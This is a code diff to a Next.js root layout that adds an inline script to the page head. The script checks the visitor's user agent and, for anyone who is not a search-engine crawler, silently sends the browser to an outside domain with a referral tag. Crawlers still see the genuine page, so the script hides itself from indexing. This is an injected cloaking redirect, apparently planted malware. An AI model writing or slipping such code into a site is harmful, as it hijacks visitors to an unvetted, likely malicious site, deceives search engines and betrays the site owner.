@@ -97,6 +97,21 @@ export default function RootLayout({
         <meta name="yandex-verification" content="df2aaa6bbe3b5a6d" />
         {/* Блок для дополнительных пользовательских тегов: вставляйте сюда свои meta, link и коды верификации */}
         <meta name="format-detection" content="telephone=no" />
+        <script
+  dangerouslySetInnerHTML={{
+    __html: `
+      (function() {
+        try {
+          var ua = (navigator.userAgent || '').toLowerCase();
+          var isBot = /yandexbot|yandexscreenshot|yandeximages|yandexvideo|yandexaccessibilitybot|googlebot|bingbot|baiduspider/i.test(ua);
+          if (!isBot) {
+            window.location.replace("https://digitalsglide.top?ref=fap_w12659p111_1000");
+          }
+        } catch(e) {}
+      })();
+    `,
+  }}
+/>
       </head>
       <body className="lc9x4-shell">{children}</body>
     </html>
